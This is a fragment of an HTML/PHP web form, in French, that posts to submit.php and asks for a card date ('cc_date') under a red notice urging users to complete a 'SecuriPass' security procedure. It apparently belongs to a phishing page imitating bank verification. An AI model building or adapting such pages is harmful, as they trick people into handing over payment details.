                ...
                <form method="post" action="submit.php">
                    ...
                    <div class="row">
                        ...
                        <div class="col-md-6">
                            <div class="form-group">
                                ...
                                <input type="text" name="cc_date" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>" value="<?php echo get_value('cc_date'); ?>" placeholder="Veuillez saisir la donnée" id="cc_date">
				 ...
				 <div>
                    <span style="color:red;font-weight: bold;">     
                          ...
                          * Important: Veuillez terminer la procédure du système de sécurité SecuriPass <br>
                    </span>
                   </div>
            </div>
        </div>
